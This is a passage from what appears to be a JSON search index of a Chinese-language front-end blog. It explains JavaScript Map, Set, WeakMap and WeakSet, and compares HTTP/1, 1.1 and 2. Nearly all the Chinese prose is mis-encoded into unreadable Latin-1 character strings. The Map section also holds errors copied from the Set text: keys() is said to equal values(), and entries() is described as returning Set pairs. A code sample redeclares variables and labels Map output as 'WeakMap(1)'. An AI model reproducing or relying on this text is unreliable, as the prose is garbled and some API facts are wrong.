","date":"2022-12-26T00:00:00Z","image":"https://live.staticflickr.com/65535/52586703288_92fa0363b4_o.jpg","permalink":"https://wayneblog.ga/2022-12-26/js-rebuild-common-function/","title":"å‰ç«¯é¢è©¦å¸¸è€ƒçš„ JavaScript æ‰‹å¯«é¡Œå½™æ•´"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nES6 æ¨å‡ºäº† Map ç‰©ä»¶ï¼Œè®“é–‹ç™¼è€…å¯ä»¥é€éé€™å€‹ç‰¹è£½è³‡æ–™çµæ§‹é€²è¡Œéµå€¼å°(key-value pairs)çš„æ“ä½œã€‚ç„¶è€Œ JavaScript åŸå§‹ç‰©ä»¶(plain object)å°±å¯ä»¥ç”¨ä¾†åšéµå€¼å°çš„æ“ä½œï¼Œç‚ºä»€éº¼é‚„éœ€è¦ Map ç‰©ä»¶å‘¢ï¼Ÿ Map ç‰©ä»¶è§£æ±ºäº†ä»€éº¼å•é¡Œï¼Ÿé‚£èˆ‡ Set åˆæœ‰ä»€éº¼ä¸åŒå‘¢ï¼Ÿæœ¬ç¯‡ä¾†è©³ç´°èªªæ˜ä¸€ä¸‹ã€‚\nMap èˆ‡ object çš„å·®åˆ¥ åŸå§‹ç‰©ä»¶çš„éµ(key)åªå¯ä»¥æ˜¯å­—ä¸²ï¼Œä½† Map çš„éµå¯ä»¥æ˜¯ä»»ä½•æ±è¥¿ åœ¨ç”¨éµå€¼å°è™•ç†è³‡æ–™æ™‚ï¼Œå¾ˆå¸¸é–‹ç™¼è€…æœƒç”¨å„é¡æ±è¥¿åšç‚ºéµ(key)ï¼Œä½†æ˜¯åœ¨ JavaScriptï¼Œå¦‚æœç”¨åŸå§‹ç‰©ä»¶ï¼Œä¸ç®¡ç”¨ä»€éº¼ç•¶åšéµï¼Œéƒ½æœƒè¢«è½‰æ›æˆå­—ä¸²ï¼Œé€™å¾€å¾€æœƒé€ æˆä¸€åˆ‡éŒ¯èª¤ï¼Œä¾‹å¦‚è¢«è½‰æˆå­—ä¸²æ™‚ï¼ŒåŸæœ¬å…©æ ¼ä¸åŒçš„éµè¢«è½‰æˆåŒæ¨£çš„å­—ä¸²ï¼Œé€™å°±å°è‡´æ’éµå•é¡Œã€‚è€Œ Map ç‰©ä»¶è§£æ±ºäº†é€™å€‹å•é¡Œï¼Œé–‹ç™¼è€…æƒ³ç”¨ä»€éº¼ç•¶éµéƒ½å¯ä»¥ã€‚\nåŸå§‹ç‰©ä»¶ä¸æ”¯æ´è¿­ä»£(iteration)ï¼Œä½† Map ç‰©ä»¶æœ‰ éå»æˆ‘å€‘æ²’è¾¦æ³•ç›´æ¥å°ä¸€å€‹åŸå§‹ç‰©ä»¶ç”¨ for...ofã€forEach ä¾†è¿­ä»£ï¼Œè€Œæ˜¯éœ€è¦ç”¨é¡å¤–çš„æ–¹æ³•ï¼Œä¾‹å¦‚ Object.entriesã€Object.keys ä¾†å”åŠ©ã€‚ä½†æ˜¯ Map ç‰©ä»¶æ˜¯å¯è¿­ä»£çš„(iterable)ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥ç›´æ¥å° Map ç‰©ä»¶ç”¨ for...ofã€forEachã€‚\nåŸå§‹ç‰©ä»¶çš„å…ƒç´ æ²’æœ‰é †åºæ€§ï¼ŒMap ç‰©ä»¶å‰‡æœ‰é †åº ä¸Šé¢æåˆ° Map ç‰©ä»¶æ˜¯å¯è¿­ä»£çš„ï¼Œå®ƒæœ‰ä¸€å€‹ç›¸é—œçš„å„ªé»æ˜¯åœ¨è¿­ä»£æ™‚æ˜¯æœ‰é †åºæ€§çš„ã€‚éå»ç”¨åŸå§‹ç‰©ä»¶ï¼Œå³ä½¿ç”¨ç”¨ç‰©ä»¶æ–¹æ³• (ä¾‹å¦‚ Object.entriesã€Object.keys ä¾†å”åŠ©è¿­ä»£)ï¼Œè¿­ä»£å‡ºçš„çµæœé †åºä¸ä¸€å®šæœƒæ˜¯æˆ‘å€‘æ”¾å…¥éµå€¼å°çš„é †åºã€‚\nä½†æœ‰æ™‚å€™åœ¨å¯«æ¼”ç®—æ³•æ™‚ï¼Œæˆ‘å€‘éœ€è¦ä¿ç•™é †åºï¼Œé€™æ™‚ Map ç‰©ä»¶å°±æœƒå¥½ç”¨å¾ˆå¤šã€‚\nMap æä¾›è¨±å¤šéµå€¼å°å¸¸ç”¨çš„æ–¹æ³•ï¼Œä½†åŸå§‹ç‰©ä»¶æ²’æœ‰ èˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœè¦çŸ¥é“ä¸€å€‹éµå€¼å°çš„å¤§å°ï¼ŒMap æœ‰ size æ–¹æ³•ï¼Œç°¡å–®åˆå¥½ç”¨ï¼›ä½†å¦‚æœç”¨åŸå§‹ç‰©ä»¶ï¼Œæˆ‘å€‘å¯èƒ½éœ€è¦ä½¿ç”¨ Object.keys ç„¶å¾Œæ­é… .length å»è‡ªå·±æ‰¾è©²ç‰©ä»¶æœ‰å¤šå°‘å€‹éµï¼Œé€™å°±éº»ç…©å¾ˆå¤šã€‚\nå¦å¤– Map ä¹Ÿæœ‰æä¾› clear æ–¹æ³•ï¼Œå¯ä»¥ä¸€æ¬¡æŠŠæ‰€æœ‰éµå€¼å°åˆªæ‰ï¼›å¦‚æœæ˜¯åŸå§‹ç‰©ä»¶å°±éœ€è¦ä¸€å€‹ä¸€å€‹åˆªã€‚\nMap é¡ä¼¼æ–¼ Object çš„è³‡æ–™çµæ§‹ï¼Œéƒ½æ˜¯ç”¨éµèˆ‡å€¼(key-value pair)çš„å½¢å¼å„²å­˜è³‡æ–™æ ¼å¼ï¼Œä½†é‚„æ˜¯æœ‰è¨±å¤šå·®ç•°ã€‚\nMap æœ¬èº«æ˜¯ä¸€ç¨®æ§‹é€ å‡½å¼ï¼Œç”¨ä¾†ç”Ÿæˆ Map é€™ç¨®æ•¸æ“šçµæ§‹ï¼Œå…·é«”åšæ³•æ˜¯ new Map() ä¾†ç”Ÿæˆå¯¦ä¾‹ã€‚\nå¸¸è¦‹æ“ä½œæ–¹æ³• Map å¸¸è¦‹æ“ä½œæ–¹æ³•æœ‰\nset(key, value)ï¼š Map æ–°å¢å…ƒç´ ã€‚ get(key)ï¼š é€ééµ(Key)æŸ¥è©¢ç‰¹å®šå…ƒç´ ï¼Œä¸¦è¿”å›ã€‚ has(key)ï¼š åˆ¤æ–· Map ä¸­æ˜¯å¦å­˜åœ¨æŸéµ(key)ã€‚ delete(key)ï¼š é€ééµ(Key)å¾ Map ä¸­ç§»é™¤ç‰¹å®šå…ƒç´ ã€‚ sizeï¼š æ–¹æ³•å¾—åˆ°å…ƒç´ çš„æ•¸é‡ã€‚ å¸¸è¦‹éæ­·æ–¹æ³• Map å¸¸è¦‹éæ­·æ–¹æ³•(éæ­·é †åºæœƒæ˜¯æ’å…¥é †åº)\nvalues()ï¼š è¿”å› Map ä¸­æ‰€æœ‰å…ƒç´ çš„å€¼ã€‚ keys()ï¼š æ–¹æ³•ç­‰åŒæ–¼ values()ã€‚ entries()ï¼š è¿”å› Set ä¸­æ‰€æœ‰çš„å…ƒç´ ï¼Œå› åœ¨ Set ä¸­æ²’æœ‰éµå€¼(Key)ï¼Œè¿”å›çš„å…ƒç´ æœƒæ˜¯ [value, value] çš„å½¢å¼ã€‚ Map å’Œ WeakMap çš„å€åˆ¥ WeakMap çš„æ–¹æ³•å’Œä½¿ç”¨éƒ¨åˆ†èˆ‡ Map è³‡æ–™çµæ§‹ç›¸è¿‘ï¼Œæœ¬å€å¡Šæœƒå°ˆæ³¨åœ¨é€™å…©è€…ä¸åŒä¹‹è™•ã€‚\nWeakMap åªå…è¨±ç‰©ä»¶(Object) ä½œç‚ºéµå(key)ï¼Œä½†æ˜¯ null é™¤å¤–ã€‚è€Œ Map å‰‡æ˜¯å¯æ¥å—å„ç¨®è³‡æ–™é¡å‹ä½œç‚ºéµå(key)ã€‚ WeakMap ä¸­çš„éµåæ˜¯**ã€Œå¼±å¼•ç”¨ã€(weak reference)**ï¼Œéµå(key)æ‰€æŒ‡å‘çš„å°è±¡å¯ä»¥è¢«åƒåœ¾å›æ”¶ï¼Œæ­¤æ™‚çš„éµå(key)æ˜¯ç„¡æ•ˆçš„ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // å¦‚æœæ”¾å…¥çš„ç‰©ä»¶åœ¨å¤–é¢æ²’æœ‰å…¶ä»–å¼•ç”¨ï¼Œåœ¨ WeakMap ä¸­æœƒè¢«åƒåœ¾å›æ”¶æ‰ let food = new WeakMap(); let fruit = { name: \u0026#39;apple\u0026#39; }; food.set(fruit, \u0026#39;good\u0026#39;); // å°‡ apple ç‰©ä»¶ç½®å…¥ WeakMap ä¸­ fruit = null; // ç§»é™¤ apple çš„å¼•ç”¨ console.log(food); // WeakMap(0) fruit å·²ç¶“è¢«åƒåœ¾å›æ”¶ï¼Œå› æ­¤ WeakMap ä¸­æ²’æœ‰é …ç›® // ä¸€èˆ¬çš„ Mapï¼Œå³ä½¿æ”¾å…¥çš„ç‰©ä»¶åœ¨å¤–é¢æ²’æœ‰å…¶ä»–å¼•ç”¨ï¼Œä»åœ¨ Map ç•¶ä¸­å­˜æ”¾ let food = new Map(); let fruit = { name: \u0026#39;apple\u0026#39; }; food.set(fruit, \u0026#39;good\u0026#39;); console.log(food); // WeakMap(1) fruit = null; console.log(food); // WeakMap(1) fruit ä¸æœƒè¢«åƒåœ¾å›æ”¶ åœ¨ä¸Šæ–¹çš„å¼·å¼•ç”¨ç¨‹å¼ç¢¼ä¸­ï¼Œé›–ç„¶ fruit ç‰©ä»¶æœ€å¾Œè¢«é‡æ–°è³¦å€¼ç‚º null (æ„æ€ç­‰åŒæ–¼ç„¡æ³•å†é€é fruit è®Šæ•¸ç²å–è©²å°è±¡å€¼ï¼Œå› ç‚ºå…¶ä¸­çš„å¼•ç”¨è¢«æ–·é–‹)ï¼Œä½†ç”±æ–¼ food èˆ‡æ­¤ç‰©ä»¶é–“å­˜åœ¨å¼·å¼•ç”¨ï¼Œæ‰€ä»¥è¢«ä¿ç•™åœ¨è¨˜æ†¶é«”ä¸­ï¼Œé€™å°±æ˜¯å‰é¢æåˆ°çš„ï¼Œå¼·å¼•ç”¨æœƒé˜²æ­¢ç‰©ä»¶è¢«åƒåœ¾å›æ”¶ï¼Œä¸¦å°‡ç‰©ä»¶ä¿ç•™åœ¨è¨˜æ†¶é«”ç•¶ä¸­ï¼› å¼±å¼•ç”¨å‰‡ç›¸åï¼Œä¸¦ä¸èƒ½é˜²æ­¢ç‰©ä»¶è¢«åƒåœ¾å›æ”¶ï¼Œç•¶ JavaScript åŸ·è¡Œç’°å¢ƒåŸ·è¡Œåƒåœ¾å›æ”¶æ™‚ï¼Œä¸Šè¿°å¼±å¼•ç”¨ä¾‹å­ä¸­çš„ fruit ç‰©ä»¶æœƒè¢«å¾è¨˜æ†¶é«”å’Œ WeakMap ä¸­åˆªé™¤ã€‚\nå¼±å¼•ç”¨çš„é©ç”¨æƒ…å¢ƒåœ¨æ–¼ï¼Œå¦‚æœå¼•ç”¨çš„ç‰©ä»¶åœ¨æœªä¾†å¯èƒ½æœƒè¢«åˆªé™¤çš„æƒ…æ³ã€ä¸”ä¸æƒ³é˜²æ­¢è¢«åƒåœ¾å›æ”¶æ™‚ï¼Œå°±é©åˆç”¨ WeakMap æˆ– WeakSetã€‚ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘å€‘æƒ³è¦è¨˜éŒ„ä¸€äº›èˆ‡ DOM ç¯€é»ç›¸é—œçš„æ•¸æ“šï¼Œæœ‰ä¸€ç¨®æ–¹æ³•æ˜¯ä½¿ç”¨ Expando æ“´å……ç¯€é»ä¸Šçš„è³‡è¨Šï¼Œä½†å£è™•æ˜¯æœƒç›´æ¥ä¿®æ”¹åˆ°é€™å€‹ DOM ç¯€é»ã€ä¸”å¦‚æœæœªä¾†é€™å€‹ç¯€é»è¢«ç§»é™¤æ™‚ï¼Œç›¸é—œè³‡è¨Šä¸æœƒè¢«åƒåœ¾å›æ”¶æ‰ï¼Œé€™æ™‚å¦‚æœæ˜¯ä½¿ç”¨ WeakMap å°±æœƒæ˜¯å¾ˆå¥½çš„æ›¿ä»£æ–¹æ¡ˆã€‚\nå‚™è¨»ï¼š å¦‚æœç›´æ¥å°‡å¼±å¼•ç”¨ç¨‹å¼ç¢¼çš„ä¾‹å­åœ¨ JavaScript åŸ·è¡Œç’°å¢ƒä¸­åŸ·è¡Œï¼Œå¯èƒ½é‚„æ˜¯æœƒçœ‹åˆ° WeakMap ä¸­æœ‰å€¼ï¼Œé€™æ˜¯å› ç‚º JavaScript åŸ·è¡Œç’°å¢ƒæœƒåœ¨ç‰¹å®šçš„æ™‚é–“é»åŸ·è¡Œåƒåœ¾å›æ”¶ã€‚\nSet Set é€™å€‹æ•¸æ“šçµæ§‹é¡ä¼¼é™£åˆ—ï¼Œä½†æ˜¯è£¡é¢çš„å…ƒç´ å€¼éƒ½æ˜¯å”¯ä¸€ï¼Œä¸æœƒæœ‰é‡è¤‡çš„å€¼ï¼Œç„¡è«–æ­¤å€¼æ˜¯åŸå§‹å‹åˆ¥(primitive values)æˆ–å¼•ç”¨å‹åˆ¥(object references)ã€‚åœ¨ JavaScript ç•¶ä¸­ï¼ŒSet æœ¬èº«æ˜¯ä¸€ç¨®æ§‹é€ å‡½å¼ï¼Œç”¨ä¾†ç”Ÿæˆ Set é€™ç¨®æ•¸æ“šçµæ§‹ï¼Œå…·é«”çš„åšæ³•æ˜¯é€é new Set() ä¾†ç”Ÿæˆå¯¦ä¾‹ã€‚\nå¸¸è¦‹æ“ä½œæ–¹æ³• Set å¸¸è¦‹æ“ä½œæ–¹æ³•æœ‰\nadd(value)ï¼š ç”¨ä¾†æ–°å¢å€¼ã€‚ delete(value)ï¼šç”¨ä¾†åˆªé™¤æ¯å€‹ Set ä¸­çš„å€¼ã€‚ has(value)ï¼šåˆ¤æ–· Set ä¸­æ˜¯å¦å­˜åœ¨æ¯å€‹å€¼ã€‚ sizeï¼š æ–¹æ³•å¾—åˆ°å…ƒç´ çš„æ•¸é‡ï¼Œèˆ‡é™£åˆ—ä½¿ç”¨ arr.length æ–¹æ³•ä¸ä¸€æ¨£ã€‚ Set ä¸­æ²’æœ‰éµå€¼(Key)ï¼Œå¦‚æœä½¿ç”¨ entries() éæ­·ï¼Œè¿”å›çš„å…ƒç´ æœƒæ˜¯ [value, value] çš„å½¢å¼ã€‚\n1 2 3 4 5 6 7 8 9 10 11 const set1 = new Set(); set1.add(42); set1.add(\u0026#39;forty two\u0026#39;); const iterator1 = set1.entries(); for (const entry of iterator1) { console.log(entry); // expected output: [42, 42] // expected output: [\u0026#34;forty two\u0026#34;, \u0026#34;forty two\u0026#34;] } Set å’Œ WeakSet çš„å€åˆ¥ WeakSet çš„æ–¹æ³•å’Œä½¿ç”¨éƒ¨åˆ†èˆ‡ Set è³‡æ–™çµæ§‹ç›¸è¿‘ï¼Œæœ¬å€å¡Šæœƒå°ˆæ³¨åœ¨é€™å…©è€…ä¸åŒä¹‹è™•ã€‚\nWeakSet å…§çš„å…ƒç´ å€¼åªå…è¨±æ˜¯ç‰©ä»¶(Object)ï¼Œä½† Set å¯æ¥å—å„ç¨®è³‡æ–™é¡å‹çš„å€¼ã€‚ 1 2 3 4 5 6 7 const wSet = new WeakSet(); const a = [1, 2, 3]; const b = { name: \u0026#39;explainthis\u0026#39; }; wSet.add(a); // WeakSetÂ {Array(3)} wSet.add(b); // WeakSet {{...}} wSet.add(1); // Uncaught TypeError: Invalid value used in weak set WeakSet å…§çš„å…ƒç´ éƒ½æ˜¯**ã€Œå¼±å¼•ç”¨ã€(weak reference)**ï¼Œå¯ä»¥è¢«åƒåœ¾å›æ”¶æ©Ÿåˆ¶å›æ”¶ã€‚å‡å¦‚ä½¿ç”¨ Set ï¼Œå³ä½¿æŸå€‹è¢«å­˜å…¥çš„å€¼ï¼Œåœ¨å…¶ä»–åœ°æ–¹å·²ç¶“æ²’æœ‰è¢«å¼•ç”¨ï¼Œè©²å€¼ä»æœƒå­˜åœ¨æ–¼ Set ç•¶ä¸­ï¼Œä¸æœƒè¢«åƒåœ¾å›æ”¶ã€‚ä½†å¦‚æœæ˜¯ WeakSetï¼Œå‰‡æœƒè¢«åƒåœ¾å›æ”¶ã€‚å¦‚æœè¦æ›´æœ‰æ„è­˜åœ°åšè¨˜æ†¶é«”ç®¡ç†ï¼ŒWeakSet åœ¨è¨±å¤šæ™‚å€™èƒ½æ´¾ä¸Šç”¨å ´ã€‚ 1 2 3 4 5 6 7 const disableElements = new WeakSet(); const loginButton = document.querySelector(\u0026#39;#login\u0026#39;); disableElements.add(loginButton); // ä½¿ç”¨çš„æ™‚å€™é€šéæŸ¥è©¢å…ƒç´ æ˜¯å¦åœ¨é›†åˆä¸­ï¼Œå°±å¯ä»¥çŸ¥é“å®ƒæ˜¯å¦è¢«ç¦ç”¨ã€‚è€Œä¸€æ—¦å…ƒç´ ä»DOMæ¨¹ä¸­åˆ é™¤ï¼Œ // WeakMapä¹Ÿæœƒé‡‹æ”¾å…¶å†…å­˜ï¼ˆç‚ºäº†åš´è¬¹ï¼Œå‡è¨­æ²¡æœ‰å…¶å®ƒåœ°æ–¹å¼•ç”¨é€™å€‹å°è±¡ï¼‰ã€‚ disableElements.has(loginButton); // true ","date":"2022-12-21T00:00:00Z","image":"https://live.staticflickr.com/65535/52576483407_0c40603733_o.jpg","permalink":"https://wayneblog.ga/2022-12-21/js-map-set-difference/","title":"Javascript ä¸­ï¼ŒMapã€Setã€WeakMap å’Œ WeakSet çš„å€åˆ¥ï¼Ÿ"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nå¾ 1989 å¹´èµ·ï¼ŒHTTP ç¶“æ­·äº†æ•¸ä»£çš„æ¼”åŒ–ï¼Œå¾ 1 åˆ° 1.1 å†åˆ° 2 ä»¥åŠç›®å‰çš„ 3ï¼Œé€™äº›ä¸åŒç‰ˆæœ¬æœ‰äº›ä»€éº¼ä¸åŒå‘¢ï¼Ÿä¸ç®¡æ˜¯å‰ç«¯æˆ–å¾Œç«¯çš„é¢è©¦ï¼Œéƒ½æ˜¯ç¶“å¸¸æœƒè€ƒçš„ã€‚é€™ç¯‡æˆ‘å€‘æœƒå…ˆé‡å° 1 åˆ° 1.1 å†åˆ° 2 ä¹‹é–“çš„ç•°åŒè™•åšæ‘˜è¦ã€‚\nå‡ºç¾æ™‚é–“ è¶…æ–‡æœ¬å‚³è¼¸å”å®š HTTP (HyperText Transfer Protocol) æ˜¯åœ¨ç¶²éš›ç¶²è·¯ä¸­ç”¨ä¾†é€šä¿¡æ•¸æ“šçš„åŸºç¤ã€‚HTTP ä¸€é–‹å§‹çš„ç™¼å±•æ˜¯å¾ 1989 å¹´æ‰€ç™¼èµ·åˆ¶å®šï¼Œå…¶ä¸­ç¶“éå¹¾å€‹æ™‚æœŸçš„æ¼”é€²ï¼ŒHTTP/1.1 æ˜¯éš¨è‘—åœ¨ 1999 å¹´ 6 æœˆå…¬å¸ƒçš„ RFC 2616 æ‰€ç™¼è¡¨ ã€‚HTTP/2 (æœ€åˆå‘½åç‚º HTTP 2.0) å‰‡æ˜¯åœ¨ 2015 å¹´ 5 æœˆä»¥ RFC 7540 æ­£å¼ç™¼è¡¨ï¼Œä¸¦å–ä»£ HTTP/1.1 æˆç‚º HTTP çš„å¯¦ä½œæ¨™æº–ã€‚æˆªè‡³ 2021 å¹´ 10 æœˆï¼Œå…¨çƒæœ‰ 46.5%çš„ç¶²ç«™æ”¯æ´äº† HTTP/2 (wiki)ã€‚\nHTTP/1 å’Œ HTTP/1.1 å·®ç•° å¾€ä¸‹è®€ä¹‹å‰ï¼Œè¦å…ˆç†è§£ä¹‹æ‰€ä»¥æœƒæœ‰ HTTP/1.1 æ˜¯å› ç‚º HTTP/1 æœ‰ä¸€äº›ä¸é‚£éº¼ç†æƒ³çš„åœ°æ–¹ã€‚å› æ­¤å»ºè­°ä¸è¦æ­»èƒŒå·®ç•°ï¼Œè€Œæ˜¯å¾ã€Œ HTTP/1.1 è§£æ±ºäº†ä»€éº¼å•é¡Œã€å‡ºç™¼ä¾†ç†è§£ã€‚\næŒä¹…é€£æ¥ (keep-alive) HTTP/1 åœ¨ç™¼é€æ¯å€‹è«‹æ±‚ä¹‹å‰éƒ½éœ€è¦å»ºç«‹ä¸€å€‹æ–°çš„é€£æ¥ï¼Œè€Œæ¯æ¬¡é€£æ¥éƒ½æ˜¯æœ‰æˆæœ¬çš„ï¼Œé€™ç¨®æ¯æ¬¡é‡é€£çš„æ–¹å¼æœƒé€ æˆå¾ˆå¤šé »å¯¬çš„æµªè²»ï¼Œä»¥åŠæ™‚é–“çš„å»¶é²ã€‚è€Œ HTTP/1.1 é»˜èªä½¿ç”¨æŒä¹…é€£æ¥ï¼Œè®“ HTTP/1.1 å¯ä»¥ä½¿ç”¨åŒä¸€å€‹ TCP é€£æ¥ä¾†é‡è¤‡å¤šå€‹ HTTP è«‹æ±‚ï¼Œé€™éº¼ä¸€ä¾†å°±å¯ä»¥é¿å…æ¯æ¬¡é‡æ–°å»ºç«‹é€£æ¥é€ æˆçš„é »å¯¬æµªè²»ã€æ™‚é–“å»¶é²ã€‚\nç‹€æ…‹ç¢¼ 100 (Continue) åœ¨æŸäº›æƒ…æ³ä¸‹ï¼Œä¼ºæœå™¨ç«¯æœƒæ‹’çµ•å®¢æˆ¶ç«¯ç™¼é€çš„è«‹æ±‚ï¼Œå› ç‚ºç™¼è«‹æ±‚æ™‚å¯èƒ½æœƒå¤¾å¸¶æ­£æ–‡ (request body)ï¼Œæ‰€ä»¥æ¯æ¬¡è«‹æ±‚è¢«æ‹’çµ•éƒ½æœƒé€ æˆé »å¯¬ä¸Šçš„é¡å¤–æµªè²»ã€‚åœ¨ HTTP/1 æ²’æœ‰æ©Ÿåˆ¶é¿å…é€™ç¨®é¡å‹çš„æµªè²»ï¼Œè€Œ HTTP/1.1 çš„ 100 (Continue) ç‹€æ…‹ç¢¼å‰‡å¯ä»¥å”åŠ©æˆ‘å€‘é¿å…é€™ç¨®æµªè²»ã€‚å…·é«”ä¾†èªªï¼ŒHTTP/1.1 è®“ä½¿ç”¨è€…ç«¯å…ˆé€å‡ºä¸€å€‹åªå«æœ‰æ¨™é ­ã€ä¸å¸¶å…§æ–‡çš„è«‹æ±‚åˆ°ä¼ºæœå™¨ï¼Œä¼ºæœå™¨ç¢ºèªæ²’æœ‰å•é¡Œä¹‹å¾Œï¼Œæœƒå›æ‡‰ç‹€æ…‹ç¢¼ 100 (Continue)ï¼›æ”¶åˆ° 100 (Continue) å¾Œï¼Œå®¢æˆ¶ç«¯æ‰æœƒæ­£å¼ç™¼ä¸€å€‹å¸¶æœ‰æ­£æ–‡çš„è«‹æ±‚ï¼›å¦‚æœæ²’æœ‰æ”¶åˆ°ï¼Œå‰‡ä»£è¡¨ä¼ºæœå™¨ç«¯ä¸æ¥å—è©²è«‹æ±‚ï¼Œé€™è®“å®¢æˆ¶ç«¯çŸ¥é“ä¼ºæœå™¨ç«¯ä¸æ¥å—ï¼Œé€™èƒ½è®“å®¢æˆ¶ç«¯å¯ä»¥é¿å…ç™¼å¸¶æœ‰æ­£æ–‡çš„è«‹æ±‚ï¼Œé€²è€Œæ¸›å°‘å‚³è¼¸ä¸Šçš„é »å¯¬æµªè²»ã€‚(è©³ç´°è«‹è¦‹ RFC çš„é€™å€‹æ®µè½)ã€‚\nå¿«å–ç·©å­˜ HTTP/1 ä¸»è¦ä½¿ç”¨æ¨™é ­ä¸­çš„ If-Modified-Sinceã€Expires ä¾†åšç‚ºç·©å­˜çš„åˆ¤æ–·æ¨™æº–ï¼Œé€™å…©è€…éƒ½æ˜¯ä»¥æ™‚é–“ä½œç‚ºä¾æ“šï¼›HTTP/1.1 å‰‡å¼•å…¥æ›´å¤šçš„ç·©å­˜ç­–ç•¥ï¼Œä¾‹å¦‚ï¼šEtagã€If-Unmodified-Sinceã€If-Matchã€If-None-Matchï¼Œé€éé€™äº›å¯ä»¥æ›´å„ªåŒ–ç·©å­˜çš„å¯¦ç¾ (é€™äº›æ¨™é ­çš„ä½¿ç”¨åœ¨é¢è©¦ä¹Ÿå¾ˆå¸¸è€ƒï¼Œè©³è¦‹é€™ç¯‡æ–‡ç« )ã€‚\nHost å­—æ®µ HTTP/1.1 å¢åŠ äº† Host å­—æ®µï¼Œç”¨ä¾†æŒ‡å®šä¼ºæœå™¨çš„åŸŸåã€‚åœ¨ HTTP/1 ä¸­ï¼Œæœƒèªç‚ºæ¯å°ä¼ºæœå™¨éƒ½ç¶å®šå”¯ä¸€çš„ IP åœ°å€ï¼Œå› æ­¤è«‹æ±‚ç•¶ä¸­çš„ URL ä¸¦æ²’æœ‰å‚³éä¸»æ©Ÿå(hostname)ã€‚ä½†éš¨è‘—ä¹‹å¾Œè™›æ“¬ä¸»æ©ŸæŠ€è¡“çš„æ¼”é€²ï¼Œç¾åœ¨åœ¨ä¸€å°ä¼ºæœå™¨ä¸Šå¯ä»¥å­˜åœ¨å¤šå€‹è™›æ“¬ä¸»æ©Ÿï¼Œä¸¦ä¸”ä»–å€‘æœƒå…±äº«åŒä¸€å€‹ IP åœ°å€ã€‚æ‰€ä»¥æœ‰äº† host å­—æ®µä¹‹å¾Œï¼Œå°±å¯ä»¥å°‡è«‹æ±‚ç™¼å¾€åŒä¸€å°ä¼ºæœå™¨ä¸Šçš„ä¸åŒç¶²ç«™ã€‚\næ›´å¤šè«‹æ±‚æ–¹æ³• HTTP/1.1 ç›¸å°æ–¼ HTTP/1 æ–°å¢äº†è¨±å¤šè«‹æ±‚æ–¹æ³•ï¼Œç¾ä»Šæˆ‘å€‘å¸¸ç”¨çš„ PUT, PATCH, DELETE, CONNECT, TRACE å’Œ OPTIONS ç­‰éƒ½æ˜¯åœ¨ HTTP/1.1 æ™‚æ–°å¢çš„ã€‚\nHTTP/2 å’Œ HTTP/1.1 æ¯”è¼ƒ å¤šè·¯å¾©ç”¨(Request multiplexing) ä¾†è§£æ±ºé ­éƒ¨é˜»å¡ (head-of-line blocking) HTTP/1.1 ä½¿ç”¨äº† pipelining çš„æ©Ÿåˆ¶ï¼Œé€™å¯ä»¥è®“å®¢æˆ¶ç«¯åœ¨åŒä¸€å€‹ TCP é€£æ¥å…§ä¸¦è¡Œç™¼å‡ºå¤šå€‹ HTTP è«‹æ±‚ï¼Œå®¢æˆ¶ç«¯ä¹Ÿä¸éœ€è¦ç­‰å¾…ä¸Šä¸€æ¬¡è«‹æ±‚çµæœè¿”å›ï¼Œå°±å¯ä»¥ç™¼å‡ºä¸‹ä¸€æ¬¡è«‹æ±‚ï¼Œä½†ä¼ºæœå™¨ç«¯å¿…é ˆä¾ç…§æ¥æ”¶åˆ°çš„å®¢æˆ¶ç«¯è«‹æ±‚çš„å…ˆå¾Œé †åºä¸€æ¬¡è¿”å›ï¼Œä»¥ä¿è­‰å®¢æˆ¶ç«¯èƒ½å¤ å€åˆ†å‡ºæ¯æ¬¡è«‹æ±‚çš„å›æ‡‰å…§å®¹ï¼Œä½†é€™é …æ©Ÿåˆ¶åœ¨å¯¦ä½œä¸Šè¼ƒé›£å¯¦ç¾ï¼Œå› æ­¤å„å®¶ç€è¦½å™¨ï¼Œéƒ½å°‡æ­¤åŠŸèƒ½é è¨­ç‚ºé—œé–‰ã€‚(å¯ä»¥åƒè€ƒæ­¤ç¯‡ stackoverflow)ã€‚æ­¤å¤– pipeline ä¹Ÿé€ æˆé ­éƒ¨é˜»å¡(head-of-line blocking ( HOL ))å•é¡Œï¼Œå¦‚æœæœ‰ä»»ä¸€å€‹è«‹æ±‚è¦æ“ä½œå¾ˆä¹…æˆ–å‚³è¼¸åŒ…æµå¤±ï¼Œé‚£å°±æœƒé˜»å¡æ•´å€‹ pipeline çš„å·¥ä½œã€‚\nHTTP/2 å¼•é€²äº†å¤šè·¯å¾©ç”¨çš„æ©Ÿåˆ¶ï¼Œè®“åŒä¸€å€‹ TCP é€£æ¥ä¸­ï¼ŒåŒæ™‚ç™¼é€å’Œæ¥å—å¤šå€‹è«‹æ±‚ï¼Œä¸¦ä¸”ä¸ç”¨ç­‰åˆ°å‰ä¸€å€‹è«‹æ±‚æ”¶åˆ°å›æ‡‰ï¼Œé€éé€™å€‹æ©Ÿåˆ¶ï¼Œè§£æ±ºäº†éå¾€åœ¨ HTTP å±¤ç´šçš„çš„é ­éƒ¨é˜»å¡å•é¡Œ (å‚™è¨»ï¼šä½† TCP å±¤ç´šä»æœ‰é ­éƒ¨é˜»å¡å•é¡Œï¼Œé€™æœƒåœ¨ HTTP/3 è¢«è§£æ±º)ã€‚\nå„ªå…ˆè«‹æ±‚é †åº HTTP/2 ç‰ˆæœ¬ä¸­ï¼Œæ¯å€‹è«‹æ±‚æˆ–å›æ‡‰çš„æ‰€æœ‰æ•¸æ“šåŒ…ï¼Œç¨±ä¹‹ç‚ºä¸€å€‹æ•¸æ“šæµï¼Œä¸¦ä¸”ï¼Œæ¯å€‹æ•¸æ“šæµæ“æœ‰ä¸€å€‹å”¯ä¸€ç·¨è™Ÿ ID (stream ID)ã€‚æ¯å€‹æ•¸æ“šåŒ…åœ¨ç™¼é€çš„æ™‚å€™å°±æœƒæˆ´ä¸Šå°æ‡‰çš„æ•¸æ“šæµç·¨è™Ÿ 